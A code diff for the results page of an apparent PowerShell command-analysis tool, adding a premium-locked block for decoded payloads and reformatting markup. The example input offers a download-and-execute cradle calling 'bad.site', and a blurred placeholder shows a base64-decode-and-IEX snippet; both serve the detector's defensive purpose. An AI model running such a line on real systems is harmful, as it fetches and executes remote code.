@@ -36,15 +36,50 @@ function getScoreLabel(score) {
   return "INFORMATIONAL";
 }
 
+// ✅ Componente para conteúdo protegido
+const ProtectedCodeBlock = ({ code, borderColorClass = "border-gray-500/20" }) => {
+  const isProtected = code === "[PREMIUM_PROTECTED_CONTENT]";
+
+  if (isProtected) {
+    return (
+      <div className={`bg-black rounded p-3 border ${borderColorClass} relative overflow-hidden min-h-[100px]`}>
+        <div className="absolute inset-0 flex flex-col items-center justify-center z-10 bg-black/40 backdrop-blur-[2px]">
+          <div className="bg-black/90 border border-green-500/50 rounded-lg p-4 flex flex-col items-center gap-2 shadow-lg">
+            <span className="text-2xl">🔒</span>
+            <span className="font-mono font-bold text-green-400 text-sm">Premium Feature</span>
+            <span className="text-[10px] text-gray-400 text-center max-w-[180px]">
+              Upgrade to view decoded & deobfuscated payloads
+            </span>
+          </div>
+        </div>
+        <div className="blur-sm select-none opacity-30 pointer-events-none font-mono text-xs" aria-hidden="true">
+          {`# Premium content hidden
+$payload = [System.Convert]::FromBase64String("...")
+IEX([System.Text.Encoding]::Unicode.GetString($payload))
+# This content is only available to premium users
+# ...
+# ...`}
+        </div>
+      </div>
+    );
+  }
+
+  return (
+    <div className={`bg-black rounded p-3 border ${borderColorClass} text-xs sm:text-sm font-mono overflow-x-auto max-h-40 whitespace-pre-wrap break-words`} style={{ color: 'var(--foreground)' }}>
+      <code>{code}</code>
+    </div>
+  );
+};
+
 export default function AnalysisDetailsPage() {
   const params = useParams();
   const router = useRouter();
   const { user, isAuthenticated } = useAuth();
   const { notifyNewAnalysis } = useAnalysisEvent();
   const { ipAddress, ipCountry, loading: ipLoading, error: ipError } = useIpAddress();
-  const { 
-    rateLimitInfo, 
-    handleRateLimitResponse, 
+  const {
+    rateLimitInfo,
+    handleRateLimitResponse,
     reset: resetRateLimit,
     timeLeft,
     isTimerActive,
@@ -71,7 +106,7 @@ export default function AnalysisDetailsPage() {
           setIsCacheRedirect(true);
           setCacheRedirectInfo(info);
           setLoading(true); // Keep loading state for smooth transition
-          
+
           sessionStorage.removeItem('cache_redirect_info');
         }
       } catch (e) {
@@ -85,9 +120,9 @@ export default function AnalysisDetailsPage() {
       setLoading(true);
       setContentReady(false);
       setError("");
-      
+
       const loadStartTime = performance.now();
-      
+
       const { makeAuthenticatedRequest } = await import('../../../lib/api');
       const res = await makeAuthenticatedRequest(`/analysis/${params.id}`, {
         headers: isCacheRedirect ? {
@@ -95,18 +130,18 @@ export default function AnalysisDetailsPage() {
           'X-Cache-Redirect': 'true'
         } : {}
       });
-      
+
       if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
       const analysisData = await res.json();
 
       const loadTime = performance.now() - loadStartTime;
-      
+
       const analysis = analysisData.analysis || analysisData;
       const analysisResult = analysis.analysis_result || analysis;
-      
+
       setCmd(analysis.command || analysisResult.command);
       setNewCommand(analysis.command || analysisResult.command);
-      
+
       const processedResult = {
         score: analysis.risk_score || analysisResult.risk_score || 0,
         severity: (analysis.risk_score || analysisResult.risk_score || 0) > 5 ? "malicious" : "safe",
@@ -118,17 +153,17 @@ export default function AnalysisDetailsPage() {
         details: analysisResult.analysis_details?.recommendations?.join(", ") || "",
         tactics: analysis.tactics || analysisResult.tactics || [],
         techniques: analysis.techniques || analysisResult.techniques || [],
-        analysisId: params.id 
+        analysisId: params.id
       };
-      
+
       setResult(processedResult);
-      
+
       // Smooth transition delay
       setTimeout(() => {
         setContentReady(true);
         setLoading(false);
       }, 150);
-      
+
     } catch (err) {
       setError(err.message || "Failed to load analysis");
       setLoading(false);
@@ -136,7 +171,7 @@ export default function AnalysisDetailsPage() {
     }
   }, [params.id, isCacheRedirect]); // ✅ FIX: Remover cacheRedirectInfo da dependência
 
-  
+
   useEffect(() => {
     if (params.id) {
       loadAnalysis();
@@ -151,14 +186,14 @@ export default function AnalysisDetailsPage() {
       setNewAnalysisLoading(true);
       setError("");
       setCacheHit(false);
-      
+
       console.log("🔍 [ANALYSIS_PAGE] Analyzing command:", command.substring(0, 100) + "...");
-      
+
       const startTime = performance.now();
       const sessionId = getOrCreateSession();
-      
+
       // ✅ FIX: Enviar comando sem trim - preservar espaços
-      const requestData = { 
+      const requestData = {
         command: command, // ✅ SEM TRIM
         user_id: user?.id || null,
         ip_address: finalIpAddress,
@@ -167,55 +202,55 @@ export default function AnalysisDetailsPage() {
         search_type: "WEB",
         session_id: sessionId
       };
-      
+
       console.log("🌐 [ANALYSIS_PAGE] Request type:", user?.id ? "Authenticated WEB" : "Anonymous WEB");
-      
+
       const { makeAuthenticatedRequest } = await import('../../../lib/api');
-      
+
       const response = await makeAuthenticatedRequest('/evaluate', {
         method: 'POST',
         body: JSON.stringify(requestData)
       });
-      
+
       const data = await response.json();
-      
-   
+
+
       const responseTime = performance.now() - startTime;
-      
-     
+
+
       const isCacheHit = data.from_cache === true || data.analysis?.cache_info?.cache_hit === true;
-      
+
       if (isCacheHit) {
         setCacheHit(true);
       }
-      
-     
+
+
       const needsHandling = handleRateLimitResponse(response, data);
-      
+
       if (needsHandling) {
         setNewAnalysisLoading(false);
         return;
       }
-      
+
       if (!response.ok) {
         throw new Error(data.error || `HTTP error! status: ${response.status}`);
       }
-      
+
       if (data.success) {
         const analysisData = data.analysis;
-        
+
         if (!data.analysis_id || data.analysis_id === "temp-cache-id" || data.analysis_id === "cache-error") {
           setError("Analysis error - please try again");
           setNewAnalysisLoading(false);
           return;
         }
-        
-       
+
+
         if (data.session_id && !user?.id) {
           saveSessionFromBackend(data.session_id);
         }
-        
-       
+
+
         if (!user?.id) {
           try {
             saveAnonymousAnalysis({
@@ -227,15 +262,15 @@ export default function AnalysisDetailsPage() {
               analysis_id: data.analysis_id
             });
           } catch (error) {
-            
+
           }
         }
-        
-       
+
+
         if (data.analysis_id) {
-          
+
           notifyNewAnalysis();
-          
+
           if (isCacheHit) {
             sessionStorage.setItem('cache_redirect_info', JSON.stringify({
               is_cache_hit: true,
@@ -244,12 +279,12 @@ export default function AnalysisDetailsPage() {
               phash: data.analysis?.cache_info?.phash,
               response_time_ms: responseTime
             }));
-            
+
             router.replace(`/analysis/${data.analysis_id}`);
           } else {
             router.push(`/analysis/${data.analysis_id}`);
           }
-          return; 
+          return;
         }
 
         const analysisResult = {
@@ -265,19 +300,19 @@ export default function AnalysisDetailsPage() {
           techniques: analysisData.techniques || [],
           analysisId: response.analysis_id
         };
-        
+
         setResult(analysisResult);
         setCmd(command);
       } else {
         throw new Error(response.error || 'Analysis failed');
       }
     } catch (err) {
-   
+
       if (err.message === 'Rate limit excedido') {
         setNewAnalysisLoading(false);
         return;
       }
-      
+
       setError(err.message);
       setResult(null);
     } finally {
@@ -292,19 +327,19 @@ export default function AnalysisDetailsPage() {
         setError("Rate limit reached. Please wait for the timer to reset.");
         return;
       }
-      
+
       analysisExecutedRef.current = false;
       setError("");
-      
+
       // ✅ FIX: Enviar comando raw sem trim ou validação
       await performAnalysis(newCommand);
-      
+
       setNewCommand("");
     }
   };
 
   const totalScore = result ? result.score : 0;
-  
+
 
   if (loading) {
     return <LoadingSpinner />;
@@ -318,7 +353,7 @@ export default function AnalysisDetailsPage() {
   const hasObfuscationIndicator = result?.signatures?.some(
     sig => sig.name === "Obfuscation Detected"
   );
-  
+
   return (
     <div className="flex-1 flex flex-col items-center justify-center p-4 sm:p-6 md:p-8 animate-fade-in">
       <style jsx>{`
@@ -336,11 +371,11 @@ export default function AnalysisDetailsPage() {
           animation: fade-in 0.4s ease-out;
         }
       `}</style>
-             <h1 className="text-2xl sm:text-3xl md:text-4xl font-mono font-bold mb-6 sm:mb-8 text-center" style={{color: 'var(--accent)'}}>
+      <h1 className="text-2xl sm:text-3xl md:text-4xl font-mono font-bold mb-6 sm:mb-8 text-center" style={{ color: 'var(--accent)' }}>
         Evaluation Results
       </h1>
 
-      
+
       <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
         <div className="flex flex-col sm:flex-row gap-3 items-start">
           <div className="flex-1 w-full">
@@ -361,28 +396,28 @@ export default function AnalysisDetailsPage() {
             {newAnalysisLoading ? 'Analyzing...' : 'Evaluate'}
           </ThemedButton>
         </div>
-        
+
         {/* Loading overlay for new analysis */}
         {newAnalysisLoading && (
           <div className="mt-4 p-4 rounded-lg border bg-black/80 border-green-500/30 text-center">
             <LoadingSpinner />
           </div>
         )}
-        <InfoMessage 
+        <InfoMessage
           message={!error && newCommand.length === 0 ? "Example: IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')" : ""}
           clickable={!error && newCommand.length === 0}
           onClick={() => setNewCommand("IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')")}
         />
-          </div>
-          
+      </div>
+
       {rateLimitInfo && (
         <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mt-4 mb-6 rounded-lg border-2 bg-black/80 border-green-500/30">
           <div className="p-4">
             <div className="text-center mb-4">
-              <div className="font-mono text-sm mb-2" style={{color: 'var(--muted-foreground)'}}>
-                <strong>Notice:</strong> You have made <span style={{color: 'var(--accent)'}}>{rateLimitInfo.current_count}</span> of <span style={{color: 'var(--accent)'}}>{rateLimitInfo.limit}</span> allowed searches in {rateLimitInfo.window_seconds} seconds.
+              <div className="font-mono text-sm mb-2" style={{ color: 'var(--muted-foreground)' }}>
+                <strong>Notice:</strong> You have made <span style={{ color: 'var(--accent)' }}>{rateLimitInfo.current_count}</span> of <span style={{ color: 'var(--accent)' }}>{rateLimitInfo.limit}</span> allowed searches in {rateLimitInfo.window_seconds} seconds.
               </div>
-        </div>
+            </div>
 
             {rateLimitInfo.current_count >= rateLimitInfo.limit && (
               <div>
@@ -390,55 +425,55 @@ export default function AnalysisDetailsPage() {
                   <div className="inline-flex items-center gap-3 px-4 py-2 rounded-full border-2 border-red-500 bg-black/80 border-green-500/30">
                     <span className="text-2xl">🚫</span>
                     <span className="font-mono font-bold text-red-500">Rate limit reached</span>
-          </div>
-        </div>
+                  </div>
+                </div>
 
                 {isTimerActive && timeLeft > 0 && (
                   <div className="text-center">
                     <div className="inline-block p-6 rounded-xl border-2 bg-black/80 border-green-500/30">
                       <div className="text-4xl mb-3">⏰</div>
-                      
-                      <div className="font-mono font-bold text-xl mb-3" style={{color: 'var(--accent)'}}>
+
+                      <div className="font-mono font-bold text-xl mb-3" style={{ color: 'var(--accent)' }}>
                         Wait for reset
-                </div>
-                
+                      </div>
+
                       <div className="font-mono text-3xl font-bold mb-4 px-4 py-2 rounded-lg border bg-black/80 border-green-500/30" style={{
                         color: 'var(--accent)'
                       }}>
                         {formatTime}
                       </div>
-                      
-                      <div className="font-mono text-sm max-w-xs mx-auto" style={{color: 'var(--muted-foreground)'}}>
+
+                      <div className="font-mono text-sm max-w-xs mx-auto" style={{ color: 'var(--muted-foreground)' }}>
                         You can make new searches when the timer reaches zero
                       </div>
-                      
+
                       <div className="mt-4 w-full bg-gray-200 dark:bg-gray-700 rounded-full h-2">
-                        <div 
-                          className="h-2 rounded-full transition-all duration-1000" 
+                        <div
+                          className="h-2 rounded-full transition-all duration-1000"
                           style={{
                             backgroundColor: 'var(--accent)',
                             width: `${Math.max(0, (timeLeft / 60) * 100)}%`
                           }}
                         ></div>
                       </div>
-                      </div>
-                      </div>
-                    )}
+                    </div>
                   </div>
                 )}
-            </div>
+              </div>
+            )}
           </div>
-        )}
+        </div>
+      )}
 
 
-     
+
       {result && (
         <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
           <div className="p-4 sm:p-6 rounded-lg border-2 border-green-400 text-center relative bg-black/80 border-green-500/30">
             <div className="absolute top-4 right-4">
               <SeverityLegend />
-                </div>
-                
+            </div>
+
             <div className="text-lg sm:text-xl font-mono font-bold mb-3 text-green-400">
               Cumulative Base Score
             </div>
@@ -451,16 +486,16 @@ export default function AnalysisDetailsPage() {
             {result.signatures && result.signatures.length > 0 && (
               <div className="text-xs font-mono text-gray-400  pt-3 mt-3">
                 {(() => {
-                  const securitySigs = result.signatures.filter(sig => 
+                  const securitySigs = result.signatures.filter(sig =>
                     !sig.name.includes('(') || sig.score >= 4.0 || !sig.techniques?.includes('T1059.001') || sig.tactics?.length > 1
                   );
-                  const allCmdlets = result.signatures.filter(sig => 
+                  const allCmdlets = result.signatures.filter(sig =>
                     sig.name.includes('(') && sig.score < 4.0 && sig.techniques?.includes('T1059.001') && sig.tactics?.length <= 1
                   );
-                  
+
                   const securityScore = securitySigs.reduce((sum, sig) => sum + (sig.total_score || sig.score || 0), 0);
                   const allCmdletScore = allCmdlets.reduce((sum, sig) => sum + (sig.total_score || sig.score || 0), 0);
-                  
+
                   return (
                     <>
                       {allCmdletScore > 0 && <div>PowerShell Cmdlets: {allCmdletScore.toFixed(1)}</div>}
@@ -469,9 +504,9 @@ export default function AnalysisDetailsPage() {
                 })()}
               </div>
             )}
-            </div>
           </div>
-        )}
+        </div>
+      )}
       {/* {result && result.decoded && (
         <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
           <div className="border rounded-lg p-4 bg-black/80 border-blue-500/30">
@@ -492,13 +527,11 @@ export default function AnalysisDetailsPage() {
       {result && result.deobfuscated && hasObfuscationIndicator && (
         <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
           <div className="border rounded-lg p-4 bg-black/80 border-purple-500/30">
-            <div className="font-mono text-sm font-bold mb-3" style={{color: 'var(--accent)'}}>
+            <div className="font-mono text-sm font-bold mb-3" style={{ color: 'var(--accent)' }}>
               🔓 Deobfuscated Command
             </div>
-            <div className="bg-black rounded p-3 border border-purple-500/20 text-xs sm:text-sm font-mono overflow-x-auto max-h-40 whitespace-pre-wrap break-words" style={{color: 'var(--foreground)'}}>
-              <code>{result.deobfuscated}</code>
-            </div>
-            <div className="text-xs font-mono mt-2" style={{color: 'var(--muted-foreground)'}}>
+            <ProtectedCodeBlock code={result.deobfuscated} borderColorClass="border-purple-500/20" />
+            <div className="text-xs font-mono mt-2" style={{ color: 'var(--muted-foreground)' }}>
               Format string obfuscation was removed (e.g., &#123;&quot;&#123;1&#125;&#123;0&#125;&quot; -f &apos;EX&apos;,&apos;I&apos;&#125; → &apos;IEX&apos;)
             </div>
           </div>
@@ -509,13 +542,11 @@ export default function AnalysisDetailsPage() {
       {result && result.decoded && result.doubleDecoded && (
         <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
           <div className="border rounded-lg p-4 bg-black/80 border-blue-500/30">
-            <div className="font-mono text-sm font-bold mb-3" style={{color: 'var(--accent)'}}>
-               First Decoded Layer (Iteration 1)
+            <div className="font-mono text-sm font-bold mb-3" style={{ color: 'var(--accent)' }}>
+              First Decoded Layer (Iteration 1)
             </div>
-            <div className="bg-black rounded p-3 border border-blue-500/20 text-xs sm:text-sm font-mono overflow-x-auto max-h-40 whitespace-pre-wrap break-words" style={{color: 'var(--foreground)'}}>
-              <code>{result.decoded}</code>
-            </div>
-            <div className="text-xs font-mono mt-2" style={{color: 'var(--muted-foreground)'}}>
+            <ProtectedCodeBlock code={result.decoded} borderColorClass="border-blue-500/20" />
+            <div className="text-xs font-mono mt-2" style={{ color: 'var(--muted-foreground)' }}>
               First layer of decoding - still contains -EncodedCommand
             </div>
           </div>
@@ -526,13 +557,11 @@ export default function AnalysisDetailsPage() {
       {result && result.decoded && !result.doubleDecoded && (
         <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
           <div className="border rounded-lg p-4 bg-black/80 border-blue-500/30">
-            <div className="font-mono text-sm font-bold mb-3" style={{color: 'var(--accent)'}}>
-               Decoded Command
+            <div className="font-mono text-sm font-bold mb-3" style={{ color: 'var(--accent)' }}>
+              Decoded Command
             </div>
-            <div className="bg-black rounded p-3 border border-blue-500/20 text-xs sm:text-sm font-mono overflow-x-auto max-h-40 whitespace-pre-wrap break-words" style={{color: 'var(--foreground)'}}>
-              <code>{result.decoded}</code>
-            </div>
-            <div className="text-xs font-mono mt-2" style={{color: 'var(--muted-foreground)'}}>
+            <ProtectedCodeBlock code={result.decoded} borderColorClass="border-blue-500/20" />
+            <div className="text-xs font-mono mt-2" style={{ color: 'var(--muted-foreground)' }}>
               This is the decoded version from -EncodedCommand
             </div>
           </div>
@@ -543,13 +572,11 @@ export default function AnalysisDetailsPage() {
       {result && result.doubleDecoded && (
         <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
           <div className="border rounded-lg p-4 bg-black/80 border-yellow-500/30">
-            <div className="font-mono text-sm font-bold mb-3" style={{color: 'var(--accent)'}}>
-               Final Decoded Command (Iteration 2)
+            <div className="font-mono text-sm font-bold mb-3" style={{ color: 'var(--accent)' }}>
+              Final Decoded Command (Iteration 2)
             </div>
-            <div className="bg-black rounded p-3 border border-yellow-500/20 text-xs sm:text-sm font-mono overflow-x-auto max-h-40 whitespace-pre-wrap break-words" style={{color: 'var(--foreground)'}}>
-              <code>{result.doubleDecoded}</code>
-            </div>
-            <div className="text-xs font-mono mt-2" style={{color: 'var(--muted-foreground)'}}>
+            <ProtectedCodeBlock code={result.doubleDecoded} borderColorClass="border-yellow-500/20" />
+            <div className="text-xs font-mono mt-2" style={{ color: 'var(--muted-foreground)' }}>
               Final layer decoded from multiple nested -EncodedCommand (2+ layers detected)
             </div>
           </div>
@@ -557,19 +584,19 @@ export default function AnalysisDetailsPage() {
       )}
 
       {result && result.signatures && result.signatures.length > 0 && (
-         <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
+        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
           {(() => {
-            const realSignatures = result.signatures.filter(sig => 
-              !sig.name.includes('(') || 
-              sig.score >= 4.0 || 
-              !sig.techniques?.includes('T1059.001') || 
-              sig.tactics?.length > 1 
+            const realSignatures = result.signatures.filter(sig =>
+              !sig.name.includes('(') ||
+              sig.score >= 4.0 ||
+              !sig.techniques?.includes('T1059.001') ||
+              sig.tactics?.length > 1
             );
-            
-            const basicCmdlets = result.signatures.filter(sig => 
-              sig.name.includes('(') && 
-              sig.score < 4.0 && 
-              sig.techniques?.includes('T1059.001') && 
+
+            const basicCmdlets = result.signatures.filter(sig =>
+              sig.name.includes('(') &&
+              sig.score < 4.0 &&
+              sig.techniques?.includes('T1059.001') &&
               sig.tactics?.length <= 1
             );
 
@@ -579,10 +606,10 @@ export default function AnalysisDetailsPage() {
                 {realSignatures.length > 0 && (
                   <IndicatorsSummaryTable signatures={realSignatures} />
                 )}
-                
+
                 {realSignatures.length > 0 && (
                   <div className="mb-6">
-                    <h2 className="text-lg sm:text-xl font-mono font-bold mb-4" style={{color: 'var(--foreground)'}}>
+                    <h2 className="text-lg sm:text-xl font-mono font-bold mb-4" style={{ color: 'var(--foreground)' }}>
                       Indicators Breakdown
                     </h2>
                     <div className="space-y-4">
@@ -619,29 +646,29 @@ export default function AnalysisDetailsPage() {
               </>
             );
           })()}
-          </div>
-        )}
+        </div>
+      )}
 
       {result && (!result.signatures || result.signatures.length === 0) && totalScore === 0 && (
-                 <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
-           <div className="border rounded-lg p-6 text-center bg-black/80 border-green-500/30">
-             <h2 className="text-lg sm:text-xl font-mono font-bold mb-2" style={{color: 'var(--foreground)'}}>
-               Zero indicators found
-               </h2>
-             <p className="text-sm sm:text-base font-mono" style={{color: 'var(--muted-foreground)'}}>
-               This command does not seem to match any indicator.
-             </p>
-               </div>
-             </div>
-          )}
+        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
+          <div className="border rounded-lg p-6 text-center bg-black/80 border-green-500/30">
+            <h2 className="text-lg sm:text-xl font-mono font-bold mb-2" style={{ color: 'var(--foreground)' }}>
+              Zero indicators found
+            </h2>
+            <p className="text-sm sm:text-base font-mono" style={{ color: 'var(--muted-foreground)' }}>
+              This command does not seem to match any indicator.
+            </p>
+          </div>
+        </div>
+      )}
 
       {result && result.signatures && result.signatures.length > 0 && (
         <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
           <div className="border rounded-lg p-4 bg-black/80 border-green-500/30">
-            <div className="font-mono text-sm" style={{color: 'var(--muted-foreground)'}}>
+            <div className="font-mono text-sm" style={{ color: 'var(--muted-foreground)' }}>
               Matched indicators are not inherently suspicious but highlight traces that may require closer examination. For interpretation details, check the link below:
               <br /><br />
-              <span style={{color: 'var(--primary-purple)'}}>&lt;wiki link to be provided later&gt;</span>
+              <span style={{ color: 'var(--primary-purple)' }}>&lt;wiki link to be provided later&gt;</span>
             </div>
           </div>
         </div>
@@ -655,9 +682,9 @@ export default function AnalysisDetailsPage() {
           variant="outline"
           onClick={() => {
             const baseUrl = window.location.origin;
-            const shareUrl = result?.analysisId 
+            const shareUrl = result?.analysisId
               ? `${baseUrl}/analysis/${result.analysisId}`
-              : window.location.href; 
+              : window.location.href;
             navigator.clipboard.writeText(shareUrl);
           }}
         >
